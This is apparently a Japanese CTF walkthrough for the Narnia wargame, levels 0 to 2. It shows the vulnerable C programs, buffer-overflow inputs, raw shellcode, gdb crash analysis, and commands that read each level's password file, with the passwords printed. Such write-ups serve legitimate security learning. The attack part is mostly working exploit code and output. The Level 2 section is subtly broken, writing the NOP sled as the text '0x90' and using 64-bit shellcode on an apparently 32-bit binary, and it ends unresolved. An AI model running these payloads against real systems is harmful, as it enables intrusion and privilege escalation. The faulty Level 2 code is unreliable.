# Narnia

## level 0
narnia0.c
```
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
bufには20文字しか入らない。試しに以下のようにすると
```
$ python -c 'print "A"*20 + "BBBBB"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```
21字からの文字がvalの値に上書きされた.

なのでそこを`0xdeadbeef`にできれば良い
```
$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```
`/bin/sh`が呼ばれるのでコマンドを送る.
```
$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
efeidiedae
```

## Level 1
```
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```
環境変数EGGの値をretに入れて呼び出している。
EGGにシェルコードを入れる.

シェルコードの入手 - http://shell-storm.org/shellcode/
```
\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
```
// 環境変数に入れる
$ export EGG=`python -c 'print "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!

$ cat /etc/narnia_pass/narnia2
nairiepecu
```

## Level 2
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```
コマンドライン引数をbufにコピーしている。bufは128バイトなので、それ以降は溢れてしまう。

```
gdb-peda$ pattc 150
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
Starting program: /home/ubuntu/Narnia/narnia2 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0x7fffff69
EDX: 0xf7fcb870 --> 0x0
ESI: 0xf7fca000 --> 0x1afdb0
EDI: 0xf7fca000 --> 0x1afdb0
EBP: 0x41514141 ('AAQA')
ESP: 0xffffd5d0 ("RAAoAA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffd5d0 ("RAAoAA")
0004| 0xffffd5d4 --> 0xff004141
0008| 0xffffd5d8 --> 0xffffd670 --> 0xffffd841 ("DISPLAY=localhost:10.0")
0012| 0xffffd5dc --> 0x0
0016| 0xffffd5e0 --> 0x0
0020| 0xffffd5e4 --> 0x0
0024| 0xffffd5e8 --> 0xf7fca000 --> 0x1afdb0
0028| 0xffffd5ec --> 0xf7ffdc04 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
gdb-peda$ patto AmAA
AmAA found at offset: 140
```
gdbで調べると上のように、140字からEIPを上書きすることがわかる。

bufにシェルコードを入れて、そのあとEIPをシェルコードのあるアドレスに書き換えれば良い。

27byteのシェルコードを使う。

```
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
`python -c 'print "0x90"*50 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "0x90"*63 + "BBBB"'`
```
`python -c 'print "0x90"*50 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "0x90"*63 + "BBBB"'`
なぜか 0xffffd8b8 になるんだががが
